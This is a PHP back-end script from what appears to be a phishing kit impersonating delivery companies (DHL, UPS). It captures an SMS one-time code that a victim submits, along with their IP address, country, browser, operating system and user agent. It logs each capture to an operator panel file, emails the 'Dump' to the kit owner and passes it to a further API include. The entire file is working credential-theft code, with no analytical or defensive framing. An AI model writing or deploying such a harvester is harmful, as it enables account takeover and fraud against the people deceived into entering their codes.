<?php

@ini_set('display_errors', 'on');
if(isset($_POST['otp1'])){session_start(); 
require 'detect.php';
include "setting.php";
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");

$otp1 = $_POST['otp1'];
$useragent = $_SERVER['HTTP_USER_AGENT'];

$ecran = $_SESSION['computer'];
$brow = $_SESSION['browser'];
$sys = $_SESSION['os'];
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
if(isset($_POST['otp1'])){
            if(!($_SESSION['otp1'])){
                $_SESSION['otp1'] = 1;

            }else{
                $count = $_SESSION['otp1'] + 1;
                $_SESSION['otp1'] = $count;

            }
        }
      

$msg = '
【✉️ - '.$IP.' - SMS - '.$_SESSION['otp1'].' ]
[👤 CODE ] = '.$otp1.'
[+]━━━━━━━━【💻 System】━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$useragent.'
【UPS - '. $alias .'】
';
$msght = '<tr>
			<td width="80">
			<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">' .$IP.'</td>
			<td width="30">
			<p align="center">SMS '.$_SESSION['otp1'].' </td>
			<td width="40">
			<p align="center">'.$otp1.'</td>
			<td width="40">
			<p align="center">'.$times.' / '.$date.'</td>
			</font></td></tr>';
$save=fopen("../../panel/otp".$namerand.".html", "a+");fwrite($save,$msght);fclose($save);
$subject  = " Dump / ".$_SERVER['REMOTE_ADDR']." / ".$country." SMS ".$_SESSION['otp1']." ";
$headers .= "From: DHL" . "\r\n";
mail($yourmail, $subject, $msg, $headers);$anti = $msg;
$_SESSION['anti']=$anti;
include("api.php");
$otpx = $_SESSION['otp1'];
}
?>